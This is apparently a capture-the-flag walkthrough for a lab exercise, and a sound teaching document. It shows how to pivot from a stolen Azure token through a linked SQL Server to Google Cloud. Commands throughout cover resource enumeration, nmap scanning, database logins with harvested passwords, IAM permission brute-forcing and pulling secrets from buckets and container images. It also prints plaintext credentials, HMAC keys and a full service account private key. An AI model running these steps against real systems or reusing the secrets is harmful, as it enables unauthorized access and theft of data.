---
title: ThunderDome -  Flag 5 - Crossing the great divide
parent: ThunderDome CTF
nav_order: 5
---

# ThunderDome - Flag 5 - Crossing the great divide
{: .no_toc }


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Recap

Let’s recap what we did for flag 4:

- Using Nina’s Azure credentials we discovered the Supply Chain Management WebApp
- Through command injection we managed to get a reverse shell on the Windows WebApp host
- We obtained database credentials and the WebApp’s Managed Identity access token

## Next steps

We can `cURL` all the things and check out the access token. But before that, let’s set some context. Remember which Subscription and Resource Group the Supply Chain Management WebApp was in?

```bash
managedIdentityResourceId:"/subscriptions/41b63b94-5bb3-41b2-a2ad-2b411979dc26/resourcegroups/MP-PROD-2/providers/Microsoft.Web/sites/supplychain-mgmt"
```

The Subscription ID was `41b63b94-5bb3-41b2-a2ad-2b411979dc26` and the Resource Group was `MP-PROD-2`.

Using this information let’s see what else is in that Resource Group. Save the access token in an environment variable for easier reference. Run:

```bash
export $TOK "<access token goes here>"
```

Let’s ensure the access token is valid and at least has `Reader` access to Subscription ID `41b63b94-5bb3-41b2-a2ad-2b411979dc26`:

```bash
curl -s -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq
```

![img]({{ '/assets/images/flag5/Untitled.png' | relative_url }}){: .center-image }

We can see Subscription ID `41b63b94-5bb3-41b2-a2ad-2b411979dc26`. Now we want to list the Resource Groups in that subscription:

```bash
curl -s -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/41b63b94-5bb3-41b2-a2ad-2b411979dc26/resourcegroups?api-version=2021-04-01" | jq
```

![img]({{ '/assets/images/flag5/Untitled 1.png' | relative_url }}){: .center-image }

## Discover resources

We can see Resource Group `MP-PROD-2`. Let’s list the resources in it:

> I’ve filtered the output to return only the name and type of resource, to keep things cleaner
> 

```bash
curl -s -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/41b63b94-5bb3-41b2-a2ad-2b411979dc26/resourcegroups/SQLANALYSIS02_group/resources?api-version=2021-04-01" | jq '.value[] | {name, type}'
```

![img]({{ '/assets/images/flag5/Untitled 2.png' | relative_url }}){: .center-image }

## SQL Server

In case you’re wondering, `Microsoft.Compute/virtualMachines` is the base Azure Virtual Machine and `Microsoft.SqlVirtualMachine/SqlVirtualMachines` is a layer on top of the Virtual Machine, providing specialised SQL Server management features. We note that there’s a public IP in the output as well:

```json
{
  "name": "SQLANALYSIS02-ip",
  "type": "Microsoft.Network/publicIPAddresses"
}
```

Let’s grab it:

```bash
curl -s -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/41b63b94-5bb3-41b2-a2ad-2b411979dc26/resourceGroups/SQLANALYSIS02_group/providers/Microsoft.Network/publicIPAddresses/SQLANALYSIS02-ip?api-version=2021-04-01" | jq -r '.properties.ipAddress'
```

We get `20.84.125.118` in return. Now we’ve discovered a SQL Server called `SQLANALYSIS02` along with its IP address. Remember the database credentials we found in flag 4?:

```sql
USE master;
EXEC sp_configure 'contained database authentication', 1;
RECONFIGURE;
ALTER DATABASE analysis SET CONTAINMENT = PARTIAL;
USE analysis;
CREATE USER db_access WITH PASSWORD = 'ECJy5u53c7cJT!!';
EXEC sp_addrolemember 'db_datareader', 'db_access';   
```

Maybe we can use these credentials with `SQLANALYSIS02`? Since we have an IP address to work with let’s run an `nmap` scan on it:

```bash
nmap -v -Pn -sCV -T4 -oN nmap.out 20.84.125.118
```

![img]({{ '/assets/images/flag5/Untitled 3.png' | relative_url }}){: .center-image }

See the flag 1 write-up for a breakdown on the `nmap` flags used. The output shows port `1433` is open running `Microsoft SQL Server 2022`. 

## Connect to SQLANALYSIS02

Let’s try and connect to `20.84.125.118` with the database credentials we found in flag 4. We’ll need a tool that allows us to run queries on an SQL Server. I’m using Kali so there are a few ways this can be done. 

### Metasploit

Run `msfconsole`. When it loads execute the following commands:

```bash
use auxiliary/admin/mssql/mssql_sql
set RHOSTS 20.84.125.118
set USERNAME db_access
set PASSWORD ECJy5u53c7cJT!!
set RPORT 1433
run
```

You can then run SQL commands:

```sql
set SQL "SELECT name FROM sys.databases;"
run
```

### Sqlcmd

Download and installation instructions are here - [https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Clinux&pivots=cs1-bash#download-and-install-sqlcmd](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Clinux&pivots=cs1-bash#download-and-install-sqlcmd). Once installed, connect to the SQL Server:

```bash
sqlcmd -S 20.84.125.118 -U db_access -P 'ECJy5u53c7cJT!!'
```

Enter a SQL command and then enter `GO`:

```sql
1> SELECT name FROM sys.databases;
2> GO
```

![img]({{ '/assets/images/flag5/Untitled 4.png' | relative_url }}){: .center-image }

### Impacket

Impacket is a collection of Python tools for testing Windows network protocols and services. It’s commonly used by security folks to look for weaknesses and vulnerabilities, check it out here if you’re interested - [https://github.com/fortra/impacket](https://github.com/fortra/impacket). Under the `impacket/examples` directory there’s a script called [`mssqlclient.py`](http://mssqlclient.py/). Run it as follows:

```bash
python3 mssqlclient.py db_access:'ECJy5u53c7cJT!!'@20.84.125.118
```

You can run commands interactively without having to enter `GO` as with `sqlcmd` or `run` as with Metasploit, after each `SQL` statement. For example:

![img]({{ '/assets/images/flag5/Untitled 5.png' | relative_url }}){: .center-image }

Whatever tool you use, the SQL statements are the same. We discover the following databases after running `SELECT name FROM sys.databases;`:

```bash
master
tempdb
model
msdb
analysis
```

These are common databases found on a SQL Server.

`master` - stores all the system-level information for the SQL Server, including configuration settings, login information, metadata about other databases, etc.

`tempdb` - used to store temporary objects created during query processing.

`model` - serves as a template for new databases created on the SQL Server.

`msdb` - used by SQL Server Agent for scheduling jobs, alerts, and backup operations.

> I’m not an SQL DBA but to dump tables in a database I used the following (using the database `analysis` and the table `replica_analysis` as an example):
> 
> 
> ```sql
> # List tables
> SELECT SCHEMA_NAME(schema_id) + '.' + name AS TableName FROM analysis.sys.tables ORDER BY schema_id, name;
> 
> # Dump table
> USE analysis; SELECT * FROM replica_analysis;
> ```
> 

Nothing of interest was found in these databases, there were a few rabbit holes including what appeared to be a temporary table `#A5F0B77C` in the `master` database. The `analysis` database contained a table called `replica_analysis` detailing medical trial metrics. At this point you may think we’ve gone through all the databases and tables for `SQLANALYSIS02` and this database is a red herring. It may indeed appear that way, however, there’s something we haven’t looked for yet - linked servers.

## Linked server

> Linked servers in Azure SQL Server provide various benefits, including unified access to data, consolidated data management and reporting, data migration, securing and governing access, etc. They allow you to connect to and access data from different databases even if they are not on the same machine. This means you can run queries and integrate data across multiple sources as if they were part of a single system.
> 

Let’s see if `SQLANALYSIS02` has a companion or whether it’s billy-SQL no mates. To check for linked servers we can run the following command:

```sql
EXEC sp_linkedservers;
```

![img]({{ '/assets/images/flag5/Untitled 6.png' | relative_url }}){: .center-image }

Success - it looks like there is indeed a linked server that `SQLANALYSIS02` speaks to and its IP address is `34.74.254.28`. Let’s see if we can query this server. The way we do this is using the following format - `EXEC ('SQL command') AT [IP address of linked server];`. For example:

```sql
EXEC ('SELECT @@VERSION;') AT [34.74.254.28];
```

![img]({{ '/assets/images/flag5/Untitled 7.png' | relative_url }}){: .center-image }

Cool - we can run commands on the linked server. This opens up another attack surface for us to explore. Let’s have a look at what databases it’s running:

```sql
EXEC ('SELECT name FROM sys.databases;') AT [34.74.254.28];
```

![img]({{ '/assets/images/flag5/Untitled 8.png' | relative_url }}){: .center-image }

We’ve found the following databases - the ones of interest in the first instance are `bulkimport` and `clinical-dataset1`:

```bash
master              
tempdb              
model               
msdb                
bulkimport          
clinical-dataset1   
```

Let’s dump tables for `bulkimport:`

```sql
EXEC ('SELECT SCHEMA_NAME(schema_id) + ''.'' + name AS TableName FROM bulkimport.sys.tables ORDER BY schema_id, name;') AT [34.74.254.28];

```

![img]({{ '/assets/images/flag5/Untitled 9.png' | relative_url }}){: .center-image }

We’ll look at the first table `myqueries` - perhaps someone has stored sensitive information there for reference?

```sql
EXEC ('USE bulkimport; SELECT * FROM myqueries;') AT [34.74.254.28];
```

![img]({{ '/assets/images/flag5/Untitled 10.png' | relative_url }}){: .center-image }

## Google Cloud

Interesting - looks like we’ve found some Google Cloud credentials. Save the output to your loot.

```bash
 -- create master key
CREATE MASTER KEY ENCRYPTION BY PASSWORD = '56u5v37ufujfc37jkv7@!'

-- create database scoped credential
CREATE DATABASE SCOPED CREDENTIAL GCSCredential
WITH IDENTITY = 'S3 Access Key',
SECRET = 'GOOG1EK5TFLGG5YIJXGVLW5LVSPVNGW53HB2NSTB7UPZX4VJCGVUAEY36CZAI:BXCiBXKI71DRbgzuJEvKz0q+UZ9i/oPjUizi6Od7';

--create external data source
CREATE EXTERNAL DATA SOURCE GCSStorage
WITH ( TYPE = BLOB_STORAGE,
LOCATION = 's3://storage.googleapis.com/mp-bulk-insert/'
, CREDENTIAL = GCSCredential
);   

CREATE EXTERNAL DATA SOURCE GCSStorageError
WITH ( TYPE = BLOB_STORAGE,
LOCATION = 's3://storage.googleapis.com/mp-bulk-insert/'
, CREDENTIAL = GCSCredential
);
EXEC msdb.dbo.gcloudsql_bulk_insert
@database = 'bulkimport',
@schema = 'dbo',
@object = 'trialdata',
@file = 's3://storage.googleapis.com/mp-bulk-insert/bulkinsert.bcp',
@formatfile = 's3://storage.googleapis.com/mp-bulk-insert/bulkinsert.fmt',
@fieldquote = '"',
@formatfiledatasource = 'GCSStorage',
@ROWTERMINATOR = '0x0A',
@fieldterminator = ',',
@datasource ='GCSStorage',
@errorfiledatasource = 'GCSStorageError',
@errorfile = 's3://storage.googleapis.com/mp-bulk-insert/bulkinsert_sampleimport.log',
@ordercolumnsjson =
'[{"name": "PersonID","order": " asc "},{"name": "BirthDate","order": "asc"}]'   

```

## Google Cloud Storage (GCS) interoperability mode

You may be thinking why a Google Cloud bucket URI contains the `scheme` `s3`? Let’s have a closer look at `s3://storage.googleapis.com/mp-bulk-insert/`:

`s3` - scheme. Protocol being used for the resource. `s3` denotes S3-compatible APIs can be used to interact with the storage.

[`storage.googleapis.com`](http://storage.googleapis.com/) - authority. Domain name of the hosting resource (endpoint for Google Cloud Storage).

`/mp-bulk-insert/` - location of the resource within the authority (bucket name).

The `s3` `scheme` is being used as part of the GCS S3 interoperability feature, which allows interaction with GCS buckets using S3-compatible APIs (for use cases such as migrating storage from AWS, leveraging existing tools designed for use primarily with AWS S3, etc.). 

### HMAC keys

Let’s investigate this bit further:

```bash
WITH IDENTITY = 'S3 Access Key',
SECRET = 'GOOG1EK5TFLGG5YIJXGVLW5LVSPVNGW53HB2NSTB7UPZX4VJCGVUAEY36CZAI:BXCiBXKI71DRbgzuJEvKz0q+UZ9i/oPjUizi6Od7';
```

The `SECRET` defined above is a pair of HMAC keys. In S3 interoperability mode, HMAC keys are used similarly to how they’re used with AWS S3 (i.e., Access Key ID and Secret Access Key authentication model). An AWS `Access Key ID` identifies an AWS account and is associated with a user. The `Secret Access Key` is a private key used to sign requests. So, if we take the HMAC keys defined in `SECRET` and split them at the colon (`:`) we get this:

`GOOG1EK5TFLGG5YIJXGVLW5LVSPVNGW53HB2NSTB7UPZX4VJCGVUAEY36CZAI` - similar to AWS Access Key ID (public portion).

`BXCiBXKI71DRbgzuJEvKz0q+UZ9i/oPjUizi6Od7` - similar to AWS Secret Access Key (private key).

## Google Cloud CLI

Let’s use the HMAC keys and authenticate via `gsutil`.

> Download Google Cloud CLI from here - [https://cloud.google.com/storage/docs/gsutil_install](https://cloud.google.com/storage/docs/gsutil_install).

Read more about authenticating with HMAC keys here - [https://cloud.google.com/storage/docs/gsutil_install#hmac](https://cloud.google.com/storage/docs/gsutil_install#hmac)
> 

- When prompted for the `google access key ID` enter `GOOG1EK5TFLGG5YIJXGVLW5LVSPVNGW53HB2NSTB7UPZX4VJCGVUAEY36CZAI`.
- When prompted for the `google secret access key` enter `BXCiBXKI71DRbgzuJEvKz0q+UZ9i/oPjUizi6Od7`.

```bash
gsutil config -a
```

![img]({{ '/assets/images/flag5/Untitled 11.png' | relative_url }}){: .center-image }

We can run `gsutil` commands to see what we can do now we’ve authenticated with the HMAC keys we found. Remember the bucket name we found in the `myqueries` table previously?

```bash
--create external data source
CREATE EXTERNAL DATA SOURCE GCSStorage
WITH ( TYPE = BLOB_STORAGE,
LOCATION = 's3://storage.googleapis.com/mp-bulk-insert/'
, CREDENTIAL = GCSCredential
);
```

Let’s run an `ls` against `mp-bulk-insert`:

```bash
gsutil ls gs://mp-bulk-insert/
```

![img]({{ '/assets/images/flag5/Untitled 12.png' | relative_url }}){: .center-image }

We see two files. Let grab them:

```bash
gsutil cp gs://mp-bulk-insert/* .
```

![img]({{ '/assets/images/flag5/Untitled 13.png' | relative_url }}){: .center-image }

`bulkinsert.bcp` contains the following:

```bash
1,Elijah,Johnson,1962-03-21
2,Anya,Smith,1982-01-15
3,Daniel,Jones,1990-05-21        
```

We’ll keep that as we may be able to make use of the names somewhere. `bulkinsert.fmt` contains:

![img]({{ '/assets/images/flag5/Untitled 14.png' | relative_url }}){: .center-image }

A `.bcp` file is used with the `bcp` (bulk copy) utility to import data into an SQL Server table. The `.bcp` file contains the data to be imported and the `.fmt` file defines the format in which the data should be imported. In the `bulkinsert.fmt` above, 13.0 denotes the version of the `bcp` utility and `4` states the number of fields. Putting the two files together, an import into a table would look like this (remember there are three records in `bulkinsert.bcp`):

- **Record 1**:
    - `1,Elijah,Johnson,1962-03-21`
    - `PersonID`: `1`
    - `FirstName`: `Elijah`
    - `LastName`: `Johnson`
    - `BirthDate`: `1962-03-21`
- **Record 2**:
    - `2,Anya,Smith,1982-01-15`
    - `PersonID`: `2`
    - `FirstName`: `Anya`
    - `LastName`: `Smith`
    - `BirthDate`: `1982-01-15`
- **Record 3**:
    - `3,Daniel,Jones,1990-05-21`
    - `PersonID`: `3`
    - `FirstName`: `Daniel`
    - `LastName`: `Jones`
    - `BirthDate`: `1990-05-21`

Anyway, I digress. The data we downloaded isn’t of much use to us. Let’s see if we can discover any more buckets:

```bash
gsutil ls
```

![img]({{ '/assets/images/flag5/Untitled 15.png' | relative_url }}){: .center-image }

We get an error. `gsutil ls` lists buckets in the currently active Google Cloud project, but we haven’t set one.

> A Google Cloud project is like an account in AWS or a subscription in Azure.
> 

## There’s a hole in your bucket

We haven’t found any references to projects yet so we have nothing we can feed to `gsutil ls`. What about if we try and get a project ID through some kind of verbose GCP API interaction? After a bit of browsing through your favourite search engine (Astalavista?) you should come across this method which relies on a verbose permissions related error:

```bash
gsutil ls -L -b gs://mp-bulk-insert/
```

`-L` - long listing. Display additional information about objects.

`-b` - bucket listing. Display metadata about buckets instead of objects in buckets.

We get the following error:

```bash
AccessDeniedException: 403 AccessDenied
<?xml version='1.0' encoding='UTF-8'?><Error><Code>AccessDenied</Code><Message>Access denied.</Message><Details>analysis@mp-proj-1-413623.iam.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).</Details></Error>
```

![img]({{ '/assets/images/flag5/Untitled 16.png' | relative_url }}){: .center-image }

The above message, while helpful, disclosed that the service account `analysis@mp-proj-1-413623.iam.gserviceaccount.com` is associated with the HMAC keys we found earlier. We also now have a Google Cloud project ID - `mp-proj-1-413623`. Now let’s run `gsutil` again, this time specifying the project ID:

```bash
gsutil ls -p mp-proj-1-413623
```

![img]({{ '/assets/images/flag5/Untitled 17.png' | relative_url }}){: .center-image }

Success - we’ve found some more buckets:

```bash
gs://gcf-v2-sources-45410776132-us-central1/
gs://gcf-v2-uploads-45410776132-us-central1/
gs://mp-bulk-insert/
gs://mp-proj-1-413623.appspot.com/
gs://staging.mp-proj-1-413623.appspot.com/
```

A `gsutil ls` of the buckets shows most are empty. We’ve already checked `mp-bulk-insert`. However, `gcf-v2-sources-45410776132-us-central1` does contain something:

![img]({{ '/assets/images/flag5/Untitled 18.png' | relative_url }}){: .center-image }

Let’s download the `pharma-drug-prices` directory with the recursive flag `-r`:

```bash
gsutil cp -r gs://gcf-v2-sources-45410776132-us-central1/* .
```

![img]({{ '/assets/images/flag5/Untitled 19.png' | relative_url }}){: .center-image }

Extracting the `zip`s we find a [`main.py`](http://main.py) Python file which appears to setup a Flask web service that pulls drug prices from a Firestore database using a Google service account. There is a service account key mentioned “for demonstration purposes”.

> Firestore is a Google Cloud noSQL database.
> 

## Google Cloud service account key

Here’s the service account key:

```bash
{
  "type": "service_account",
  "project_id": "mp-proj-1-413623",
  "private_key_id": "4763a8a59f10c6da55caf3e1f95cf4f056e411f8",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC4GWXj4wucvHuR\n2wEXf5lxjGDUZAkEM+bs+8YeNobF6aGkmPeXnvl+ow1LNg4Cpzjbu5DwCqYCZArz\nE1TpXTbTR+EBbQKaPeKFEdy7zBiFLYXStiSHCr2xFmgJ4FrCa+0gWspqj0CugBSn\nZFd0skPocgoHeviz8tm4JA75Q4c0m5KMqE9Mj8TpKgSoBvnYklYQNPgFAc4JDkGM\naV1nvK9DpqWM6sseVfW65YEi3cJhHIrdwqN72nr9pylUyzsG25YzCO8eBIcvU/3t\nMUAV3L03utkTkTLusp8FjvuiNUXWKPKgg8yW5KkORB7V6qft4ltZHokYPyvCUxVi\ndnm2GtmRAgMBAAECggEAA+70/Jq+BYYIbNwdSJt/E4xAiGEvySFzwmX5vG0FUaa1\nf68OATUSFxjUQKJhx8A7aIR4KwzLMbth+YIU+xx0/qwnPFDQMKv4UkgIq5GHh5bq\nqE8gdisuVOGJ7QYYYlWMfje6Ye74HpJZfp8X+EQTy9xd5v2DYVLjwHmywTQmaCMO\nhlpvwPfp7PdFy4X/bSTs0/L5QNr5U2vBU1fifw6NGZIhksJZrJpP1VIXUgLWRSNN\nwI5SHXrv4HPRMmwKfUWCstyCu9hm69KIbpIL29bFfcMHby6ShCShZKtIZU0lfEqF\nU8dgcyTvbdK9AfCw+KeX6EFcSL64YyCzAernI25m3QKBgQDacsW7ZQGJchHd7T6q\nGAg9bJ7FWN7CAMwGt3XH4VOboDfVsDGmaz/Y16402b7dmbB8ww8gbnMm3b+vUKmJ\nPRMUDOvjkEIN2ycVP6ZBS+2RVaffjyoOdCaqAVWxXPU5Jf5JrQLR7F5bJvWanv1J\n57wCE6PFp2kYmcVpGb6+7uGGPQKBgQDXvwdCnFagltLnjipcP+djNWzvGrRElwei\nnMkyuBWWs4ZetsFh9E/CjEv6Ig8S2viHtU/Lq4mK/gAhcIx67e/SNCcVRQ/lqDER\nPvvbS86o4h25t/VMS4i0j9LlhNHYaWmTXms6GjSo5yOVacMDjdbmcIgOhEKxse4i\nRqGwYzYp5QKBgQCbtD0eckNjLaxwjB8jbFfLOHX+4nZ8v8atbu0D2KcYgV3q8Vii\nb0WmES25vA7gsyBp/Tr1+eQYKuzrUEpXaPIFU6R7oqKCb9fuvFyLpEwkUHKE1e27\nOa0pdiQXdNPRtTQIXcppyNoEjMN5P6P4nrWSoV8VjltJzqk4XcJpI6oaXQKBgQCj\nBZzFz36B0BXDlKAbnsoIJAmRTxtiLME/NbuuUH03p6XkEbJkgwh12C9c7bl4JO/h\nE7cdDhxbY3zTx8jO5tXtfyz9HHdbsNCK2I3U8h5RbLLLb96x7O16iqbweYFbRqPZ\nEGJzv/OEoUs5DnamS9pTvDqCxZvjy7BGRBrPPthhpQKBgDXEZTAVa1hbCYeVj5Pp\nV2JJn1qdVT55fph/NMwd+9RLV3WyRMkUvETKOXKnxl2AniaSyzaCFlp2BItAwh8C\nVmXjgv2IMt8ULAkGx+6MJYPUTMIB2jMopvoYOdNISbi6J8r4ga6u+oSx/fZiQYf0\ntfqznGge69pVRHqmVs6tsPrl\n-----END PRIVATE KEY-----\n",
  "client_email": "analysis@mp-proj-1-413623.iam.gserviceaccount.com",
  "client_id": "111876118613592668111",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/analysis%40mp-proj-1-413623.iam.gserviceaccount.com"
}
```

Here’s the service account:

```bash
 "client_email": "analysis@mp-proj-1-413623.iam.gserviceaccount.com",
```

> A Google `service account` allows (typically) non-human (programmatic, usually applications or virtual machines) entities to authenticate to Google services. A `service account key` is a JSON file that contains the credentials for the service account.
> 

We’ll save the service account key to a file called `analysis.json` and activate the service account `analysis@mp-proj-1-413623.iam.gserviceaccount.com`:

```bash
gcloud auth activate-service-account --key-file=analysis.json
```

![img]({{ '/assets/images/flag5/Untitled 20.png' | relative_url }}){: .center-image }

We can check authenticated Google Cloud accounts and check which one is active with `gcloud config list`:

![img]({{ '/assets/images/flag5/Untitled 21.png' | relative_url }}){: .center-image }

We should probably do some enumeration to see what this service account allows to do or access. What would help us in this case is the access token for the service account. Let’s grab that:

```bash
gcloud auth print-access-token
```

![img]({{ '/assets/images/flag5/Untitled 22.png' | relative_url }}){: .center-image }

Export it to an environment variable for easy reference:

```bash
export GCPTOK="Your token goes here"
```

## GCP IAM Brute

Download GCP IAM Brute from here - [https://github.com/hac01/gcp-iam-brute](https://github.com/hac01/gcp-iam-brute). We’ll run it, passing the access token (`$GCPTOK`), project ID (`mp-proj-1-413623`) and service account email (`analysis@mp-proj-1-413623.iam.gserviceaccount`):

```bash
python3 main.py --access-token $GCPTOK --project-id mp-proj-1-413623 --service-account-email analysis@mp-proj-1-413623.iam.gserviceaccount.com
```

When it finishes, we see the following interesting permissions for `artifactregistry`:

```json
{'permissions': ['artifactregistry.dockerimages.get', 'artifactregistry.dockerimages.list', 'artifactregistry.files.get', 'artifactregistry.files.list', 'artifactregistry.locations.get', 'artifactregistry.locations.list', 'artifactregistry.packages.list', 'artifactregistry.repositories.downloadArtifacts', 'artifactregistry.repositories.get', 'artifactregistry.repositories.list', 'artifactregistry.tags.list', 'artifactregistry.versions.list']}
```

I think it would be a good idea to list `artifactregistry` repositories:

```bash
gcloud artifacts repositories list --project=mp-proj-1-413623 --format="json" | jq
```

![img]({{ '/assets/images/flag5/Untitled 23.png' | relative_url }}){: .center-image }

We can see two repositories. The both appear to hold `docker` images. Let’s investigate further and describe the repositories:

`gcf-artifacts`

```bash
gcloud artifacts repositories describe gcf-artifacts --location us-central1 --project=mp-proj-1-413623 --format="json | jq
```

![img]({{ '/assets/images/flag5/Untitled 24.png' | relative_url }}){: .center-image }

`mp-default` 

```bash
gcloud artifacts repositories describe mp-default --location us-east1 --project=mp-proj-1-413623 --format="json" | jq
```

![img]({{ '/assets/images/flag5/Untitled 25.png' | relative_url }}){: .center-image }

> Note the `Registry URL` for each repository:

`gcf-artifacts` - `us-central1-docker.pkg.dev/mp-proj-1-413623/gcf-artifacts` 
`mp-default` - `us-east1-docker.pkg.dev/mp-proj-1-413623/mp-default`
> 

## List registries

Next, we’ll list the images in each registry:

`gcf-artifacts`:

```bash
gcloud artifacts docker images list us-central1-docker.pkg.dev/mp-proj-1-413623/gcf-artifacts --include-tags --format="json" | jq
```

![img]({{ '/assets/images/flag5/Untitled 26.png' | relative_url }}){: .center-image }

The images seem to mention drug prices. We could look at these further but let’s skip that and see what images are in the `mp-default` registry:

```bash
gcloud artifacts docker images list us-east1-docker.pkg.dev/mp-proj-1-413623/mp-default --include-tags --format="json" | jq
```

![img]({{ '/assets/images/flag5/Untitled 27.png' | relative_url }}){: .center-image }

There’s only one image in the `mp-default` registry - `mp-seave`. We’ll download it and see what we can do with it, but before that, we need to configure Docker to authenticate with the Google Cloud Artifact Registry `mp-default` using our service account. We can do this by running:

```bash
gcloud auth configure-docker us-east1-docker.pkg.dev
```

When you run the above command you’ll be prompted whether you want to update credential helpers (`credHelpers`) in `~/.docker/config.json`. Credential helpers are used by Docker to manage authentication credentials for specific registries. We want to use the `gcloud` CLI to authenticate to `us-east1-docker.pkg.dev` so the entry in `~/.docker/config.json` would look like this:

```json
{
  "credHelpers": {
    "us-east1-docker.pkg.dev": "gcloud"
  }
}

```

In the `gcloud auth configure-docker` command we got `us-east1-docker.pkg.dev` from the `mp-default` registry `URL` I told you to take note of earlier - `us-east1-docker.pkg.dev/mp-proj-1-413623/mp-default`. We also want to take note of the image’s tag - `dev2`. Let’s download the image:

```bash
docker pull us-east1-docker.pkg.dev/mp-proj-1-413623/mp-default/mp-seave:dev2
```

![img]({{ '/assets/images/flag5/Untitled 28.png' | relative_url }}){: .center-image }

We now want to start the container and launch an interactive shell. The `-it` flags give us an interactive terminal session:

```bash
docker run -it us-east1-docker.pkg.dev/mp-proj-1-413623/mp-default/mp-seave:dev2
```

![img]({{ '/assets/images/flag5/Untitled 29.png' | relative_url }}){: .center-image }

We don’t really know what’s in the container until we explore it, but two directories stand out - `/app` and `/root`. `/app` is commonly used in containers to deploy applications and functionality so let’s check it out first:

![img]({{ '/assets/images/flag5/Untitled 30.png' | relative_url }}){: .center-image }

We’re not interested in the `google-cloud-sdk` but the `.json` file looks very interesting:

![img]({{ '/assets/images/flag5/Untitled 31.png' | relative_url }}){: .center-image }

Looks like a service account key for the `automation@mp-proj-1-413623.iam.gserviceaccount.com` service account. We’ll add this to our loot and copy the output of `mp-proj-1-413623-7040c0bc7c06.json` to `automation.json` on  our local machine.

## Flag 5

Let’s turn to `/root` now:

![img]({{ '/assets/images/flag5/Untitled 32.png' | relative_url }}){: .center-image }

There’s flag 5! Make sure you’ve stashed loot we’ve found along the way and I’ll see you in flag 6. Remember - `ssh`hhhh, it’s a secret portal in the ether.
